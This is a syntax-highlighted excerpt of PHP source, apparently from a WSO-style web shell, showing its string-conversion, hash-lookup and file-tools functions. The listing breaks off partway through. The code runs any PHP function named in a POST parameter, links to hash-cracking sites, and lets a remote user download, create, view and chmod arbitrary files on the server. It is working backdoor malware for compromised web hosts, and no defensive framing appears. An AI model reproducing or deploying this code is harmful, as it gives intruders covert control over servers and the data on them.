<span class="lineno"> 648</span>     <span class="nx">printHeader</span><span class="p">();</span> 
<span class="lineno"> 649</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;String conversions&lt;/h1&gt;&lt;div class=content&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 650</span>     <span class="nv">$stringTools</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> 
<span class="lineno"> 651</span>         <span class="s1">&#39;Base64 encode&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;base64_encode&#39;</span><span class="p">,</span> 
<span class="lineno"> 652</span>         <span class="s1">&#39;Base64 decode&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;base64_decode&#39;</span><span class="p">,</span> 
<span class="lineno"> 653</span>         <span class="s1">&#39;Url encode&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;urlencode&#39;</span><span class="p">,</span> 
<span class="lineno"> 654</span>         <span class="s1">&#39;Url decode&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;urldecode&#39;</span><span class="p">,</span> 
<span class="lineno"> 655</span>         <span class="s1">&#39;Full urlencode&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;full_urlencode&#39;</span><span class="p">,</span> 
<span class="lineno"> 656</span>         <span class="s1">&#39;md5 hash&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;md5&#39;</span><span class="p">,</span> 
<span class="lineno"> 657</span>         <span class="s1">&#39;sha1 hash&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;sha1&#39;</span><span class="p">,</span> 
<span class="lineno"> 658</span>         <span class="s1">&#39;crypt&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;crypt&#39;</span><span class="p">,</span> 
<span class="lineno"> 659</span>         <span class="s1">&#39;CRC32&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;crc32&#39;</span><span class="p">,</span> 
<span class="lineno"> 660</span>         <span class="s1">&#39;ASCII to HEX&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;ascii2hex&#39;</span><span class="p">,</span> 
<span class="lineno"> 661</span>         <span class="s1">&#39;HEX to ASCII&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;hex2ascii&#39;</span><span class="p">,</span> 
<span class="lineno"> 662</span>         <span class="s1">&#39;HEX to DEC&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;hexdec&#39;</span><span class="p">,</span> 
<span class="lineno"> 663</span>         <span class="s1">&#39;HEX to BIN&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;hex2bin&#39;</span><span class="p">,</span> 
<span class="lineno"> 664</span>         <span class="s1">&#39;DEC to HEX&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;dechex&#39;</span><span class="p">,</span> 
<span class="lineno"> 665</span>         <span class="s1">&#39;DEC to BIN&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;decbin&#39;</span><span class="p">,</span> 
<span class="lineno"> 666</span>         <span class="s1">&#39;BIN to HEX&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;bin2hex&#39;</span><span class="p">,</span> 
<span class="lineno"> 667</span>         <span class="s1">&#39;BIN to DEC&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;bindec&#39;</span><span class="p">,</span>         
<span class="lineno"> 668</span>         <span class="s1">&#39;String to lower case&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;strtolower&#39;</span><span class="p">,</span> 
<span class="lineno"> 669</span>         <span class="s1">&#39;String to upper case&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;strtoupper&#39;</span><span class="p">,</span> 
<span class="lineno"> 670</span>         <span class="s1">&#39;Htmlspecialchars&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;htmlspecialchars&#39;</span><span class="p">,</span> 
<span class="lineno"> 671</span>         <span class="s1">&#39;String length&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;strlen&#39;</span><span class="p">,</span> 
<span class="lineno"> 672</span>     <span class="p">);</span> 
<span class="lineno"> 673</span>     <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">])</span><span class="o">&amp;&amp;!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> 
<span class="lineno"> 674</span>         <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno"> 675</span>     <span class="k">echo</span> <span class="s2">&quot;&lt;form name=&#39;toolsForm&#39; onSubmit=&#39;if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;&#39;&gt;&lt;select name=&#39;selectTool&#39;&gt;&quot;</span><span class="p">;</span> 
<span class="lineno"> 676</span>     <span class="k">foreach</span><span class="p">(</span><span class="nv">$stringTools</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> 
<span class="lineno"> 677</span>         <span class="k">echo</span> <span class="s2">&quot;&lt;option value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&gt;&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;&lt;/option&gt;&quot;</span><span class="p">;</span> 
<span class="lineno"> 678</span>         <span class="k">echo</span> <span class="s2">&quot;&lt;/select&gt;&lt;input type=&#39;submit&#39; value=&#39;&gt;&gt;&#39;/&gt; &lt;input type=checkbox name=ajax value=1 &quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span><span class="o">?</span><span class="s1">&#39;checked&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&gt; send using AJAX&lt;br&gt;&lt;textarea name=&#39;input&#39; style=&#39;margin-top:5px&#39; class=bigarea&gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&lt;/textarea&gt;&lt;/form&gt;&lt;pre class=&#39;ml1&#39; style=&#39;&quot;</span><span class="o">.</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;display:none;&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;margin-top:5px&#39; id=&#39;strOutput&#39;&gt;&quot;</span><span class="p">;</span> 
<span class="lineno"> 679</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno"> 680</span>         <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> 
<span class="lineno"> 681</span>         <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">](</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]));</span> 
<span class="lineno"> 682</span>     <span class="p">}</span> 
<span class="lineno"> 683</span>     <span class="k">echo</span><span class="s2">&quot;&lt;/pre&gt;&lt;/div&gt;&quot;</span><span class="p">;</span> 
<span class="lineno"> 684</span>     <span class="cp">?&gt;</span><span class="x"> </span>
<span class="lineno"> 685</span> <span class="x">    &lt;br&gt;&lt;h1&gt;Search for hash:&lt;/h1&gt;&lt;div class=content&gt; </span>
<span class="lineno"> 686</span> <span class="x">        &lt;form method=&#39;post&#39; target=&#39;_blank&#39; name=&quot;hf&quot;&gt; </span>
<span class="lineno"> 687</span> <span class="x">            &lt;input type=&quot;text&quot; name=&quot;hash&quot; style=&quot;width:200px;&quot;&gt;&lt;br&gt; </span>
<span class="lineno"> 688</span> <span class="x">            &lt;input type=&quot;button&quot; value=&quot;hashcrack.com&quot; onclick=&quot;document.hf.action=&#39;http://www.hashcrack.com/index.php&#39;;document.hf.submit()&quot;&gt;&lt;br&gt; </span>
<span class="lineno"> 689</span> <span class="x">            &lt;input type=&quot;button&quot; value=&quot;milw0rm.com&quot; onclick=&quot;document.hf.action=&#39;http://www.milw0rm.com/cracker/search.php&#39;;document.hf.submit()&quot;&gt;&lt;br&gt; </span>
<span class="lineno"> 690</span> <span class="x">            &lt;input type=&quot;button&quot; value=&quot;hashcracking.info&quot; onclick=&quot;document.hf.action=&#39;https://hashcracking.info/index.php&#39;;document.hf.submit()&quot;&gt;&lt;br&gt; </span>
<span class="lineno"> 691</span> <span class="x">            &lt;input type=&quot;button&quot; value=&quot;md5.rednoize.com&quot; onclick=&quot;document.hf.action=&#39;http://md5.rednoize.com/?q=&#39;+document.hf.hash.value+&#39;&amp;s=md5&#39;;document.hf.submit()&quot;&gt;&lt;br&gt; </span>
<span class="lineno"> 692</span> <span class="x">            &lt;input type=&quot;button&quot; value=&quot;md5decrypter.com&quot; onclick=&quot;document.hf.action=&#39;http://www.md5decrypter.com/&#39;;document.hf.submit()&quot;&gt;&lt;br&gt; </span>
<span class="lineno"> 693</span> <span class="x">        &lt;/form&gt; </span>
<span class="lineno"> 694</span> <span class="x">    &lt;/div&gt; </span>
<span class="lineno"> 695</span> <span class="x">    </span><span class="cp">&lt;?php</span> 
<span class="lineno"> 696</span>     <span class="nx">printFooter</span><span class="p">();</span> 
<span class="lineno"> 697</span> <span class="p">}</span> 
<span class="lineno"> 698</span> 
<span class="lineno"> 699</span> <span class="k">function</span> <span class="nf">actionFilesTools</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno"> 700</span>     <span class="k">if</span><span class="p">(</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">)</span> 
<span class="lineno"> 701</span>         <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span> 
<span class="lineno"> 702</span>     <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;download&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 703</span>         <span class="k">if</span><span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_readable</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno"> 704</span>             <span class="nb">ob_start</span><span class="p">(</span><span class="s2">&quot;ob_gzhandler&quot;</span><span class="p">,</span> <span class="mi">4096</span><span class="p">);</span> 
<span class="lineno"> 705</span>             <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Disposition: attachment; filename=&quot;</span><span class="o">.</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]));</span> 
<span class="lineno"> 706</span>             <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;mime_content_type&quot;</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 707</span>                 <span class="nv">$type</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mime_content_type</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span> 
<span class="lineno"> 708</span>                 <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Type: &quot;</span><span class="o">.</span><span class="nv">$type</span><span class="p">);</span> 
<span class="lineno"> 709</span>             <span class="p">}</span> 
<span class="lineno"> 710</span>             <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="s2">&quot;r&quot;</span><span class="p">);</span> 
<span class="lineno"> 711</span>             <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 712</span>                 <span class="k">while</span><span class="p">(</span><span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">))</span> 
<span class="lineno"> 713</span>                     <span class="k">echo</span> <span class="o">@</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span> 
<span class="lineno"> 714</span>                 <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span> 
<span class="lineno"> 715</span>             <span class="p">}</span> 
<span class="lineno"> 716</span>         <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_readable</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno"> 717</span> 
<span class="lineno"> 718</span>         <span class="p">}</span> 
<span class="lineno"> 719</span>         <span class="k">exit</span><span class="p">;</span> 
<span class="lineno"> 720</span>     <span class="p">}</span> 
<span class="lineno"> 721</span>     <span class="k">if</span><span class="p">(</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;mkfile&#39;</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 722</span>         <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno"> 723</span>             <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="s1">&#39;w&#39;</span><span class="p">);</span> 
<span class="lineno"> 724</span>             <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 725</span>                 <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;edit&quot;</span><span class="p">;</span> 
<span class="lineno"> 726</span>                 <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span> 
<span class="lineno"> 727</span>             <span class="p">}</span> 
<span class="lineno"> 728</span>         <span class="p">}</span> 
<span class="lineno"> 729</span>     <span class="p">}</span> 
<span class="lineno"> 730</span>     <span class="nx">printHeader</span><span class="p">();</span> 
<span class="lineno"> 731</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;File tools&lt;/h1&gt;&lt;div class=content&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 732</span>     <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 733</span>         <span class="k">echo</span> <span class="s1">&#39;File not exists&#39;</span><span class="p">;</span> 
<span class="lineno"> 734</span>         <span class="nx">printFooter</span><span class="p">();</span> 
<span class="lineno"> 735</span>         <span class="k">return</span><span class="p">;</span> 
<span class="lineno"> 736</span>     <span class="p">}</span> 
<span class="lineno"> 737</span>     <span class="nv">$uid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getpwuid</span><span class="p">(</span><span class="o">@</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]));</span> 
<span class="lineno"> 738</span>     <span class="nv">$gid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getgrgid</span><span class="p">(</span><span class="o">@</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]));</span> 
<span class="lineno"> 739</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;span&gt;Name:&lt;/span&gt; &#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39; &lt;span&gt;Size:&lt;/span&gt; &#39;</span><span class="o">.</span><span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">?</span><span class="nx">viewSize</span><span class="p">(</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span><span class="o">:</span><span class="s1">&#39;-&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; &lt;span&gt;Permission:&lt;/span&gt; &#39;</span><span class="o">.</span><span class="nx">viewPermsColor</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39; &lt;span&gt;Owner/Group:&lt;/span&gt; &#39;</span><span class="o">.</span><span class="nv">$uid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$gid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 740</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;span&gt;Create time:&lt;/span&gt; &#39;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">,</span><span class="nb">filectime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span><span class="o">.</span><span class="s1">&#39; &lt;span&gt;Access time:&lt;/span&gt; &#39;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">,</span><span class="nb">fileatime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span><span class="o">.</span><span class="s1">&#39; &lt;span&gt;Modify time:&lt;/span&gt; &#39;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">,</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&lt;br&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 741</span>     <span class="k">if</span><span class="p">(</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="p">)</span> 
<span class="lineno"> 742</span>         <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;view&#39;</span><span class="p">;</span> 
<span class="lineno"> 743</span>     <span class="k">if</span><span class="p">(</span> <span class="nb">is_file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">)</span> 
<span class="lineno"> 744</span>         <span class="nv">$m</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;View&#39;</span><span class="p">,</span> <span class="s1">&#39;Highlight&#39;</span><span class="p">,</span> <span class="s1">&#39;Download&#39;</span><span class="p">,</span> <span class="s1">&#39;Hexdump&#39;</span><span class="p">,</span> <span class="s1">&#39;Edit&#39;</span><span class="p">,</span> <span class="s1">&#39;Chmod&#39;</span><span class="p">,</span> <span class="s1">&#39;Rename&#39;</span><span class="p">,</span> <span class="s1">&#39;Touch&#39;</span><span class="p">);</span> 
<span class="lineno"> 745</span>     <span class="k">else</span> 
<span class="lineno"> 746</span>         <span class="nv">$m</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;Chmod&#39;</span><span class="p">,</span> <span class="s1">&#39;Rename&#39;</span><span class="p">,</span> <span class="s1">&#39;Touch&#39;</span><span class="p">);</span> 
<span class="lineno"> 747</span>     <span class="k">foreach</span><span class="p">(</span><span class="nv">$m</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> 
<span class="lineno"> 748</span>         <span class="k">echo</span> <span class="s1">&#39;&lt;a href=# onclick=&quot;g(null,null,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;\&#39;)&quot;&gt;&#39;</span><span class="o">.</span><span class="p">((</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">==@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;&lt;b&gt;[ &#39;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s1">&#39; ]&lt;/b&gt;&#39;</span><span class="o">:</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/a&gt; &#39;</span><span class="p">;</span> 
<span class="lineno"> 749</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;br&gt;&lt;br&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 750</span>     <span class="k">switch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="p">{</span> 
<span class="lineno"> 751</span>         <span class="k">case</span> <span class="s1">&#39;view&#39;</span><span class="o">:</span> 
<span class="lineno"> 752</span>             <span class="k">echo</span> <span class="s1">&#39;&lt;pre class=ml1&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 753</span>             <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="s1">&#39;r&#39;</span><span class="p">);</span> 
<span class="lineno"> 754</span>             <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 755</span>                 <span class="k">while</span><span class="p">(</span> <span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">)</span> 
<span class="lineno"> 756</span>                     <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">1024</span><span class="p">));</span> 
<span class="lineno"> 757</span>                 <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span> 
<span class="lineno"> 758</span>             <span class="p">}</span> 
<span class="lineno"> 759</span>             <span class="k">echo</span> <span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 760</span>             <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 761</span>         <span class="k">case</span> <span class="s1">&#39;highlight&#39;</span><span class="o">:</span> 
<span class="lineno"> 762</span>             <span class="k">if</span><span class="p">(</span> <span class="nb">is_readable</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 763</span>                 <span class="k">echo</span> <span class="s1">&#39;&lt;div class=ml1 style=&quot;background-color: #e1e1e1;color:black;&quot;&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 764</span>                 <span class="nv">$code</span> <span class="o">=</span> <span class="nb">highlight_file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span><span class="k">true</span><span class="p">);</span> 
<span class="lineno"> 765</span>                 <span class="k">echo</span> <span class="nb">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;&lt;span &#39;</span><span class="p">,</span><span class="s1">&#39;&lt;/span&gt;&#39;</span><span class="p">),</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&lt;font &#39;</span><span class="p">,</span><span class="s1">&#39;&lt;/font&gt;&#39;</span><span class="p">),</span><span class="nv">$code</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 766</span>             <span class="p">}</span> 
<span class="lineno"> 767</span>             <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 768</span>         <span class="k">case</span> <span class="s1">&#39;chmod&#39;</span><span class="o">:</span> 
<span class="lineno"> 769</span>             <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 770</span>                 <span class="nv">$perms</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> 
<span class="lineno"> 771</span>                 <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span><span class="nv">$i</span><span class="o">&gt;=</span><span class="mi">0</span><span class="p">;</span><span class="o">--</span><span class="nv">$i</span><span class="p">)</span> 
<span class="lineno"> 772</span>                     <span class="nv">$perms</span> <span class="o">+=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span><span class="o">*</span><span class="nb">pow</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span><span class="o">-</span><span class="nv">$i</span><span class="o">-</span><span class="mi">1</span><span class="p">));</span> 
<span class="lineno"> 773</span>                 <span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nb">chmod</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nv">$perms</span><span class="p">))</span> 
<span class="lineno"> 774</span>                     <span class="k">echo</span> <span class="s1">&#39;Can\&#39;t set permissions!&lt;br&gt;&lt;script&gt;document.mf.p3.value=&quot;&quot;;&lt;/script&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 775</span>                 <span class="k">else</span> 
<span class="lineno"> 776</span>                     <span class="k">die</span><span class="p">(</span><span class="s1">&#39;&lt;script&gt;g(null,null,null,null,&quot;&quot;)&lt;/script&gt;&#39;</span><span class="p">);</span> 
<span class="lineno"> 777</span>             <span class="p">}</span> 
<span class="lineno"> 778</span>             <span class="k">echo</span> <span class="s1">&#39;&lt;form onsubmit=&quot;g(null,null,null,null,this.chmod.value);return false;&quot;&gt;&lt;input type=text name=chmod value=&quot;&#39;</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%o&#39;</span><span class="p">,</span> <span class="nb">fileperms</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])),</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&quot;&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 779</span>             <span class="k">break</span><span class="p">;</span> 
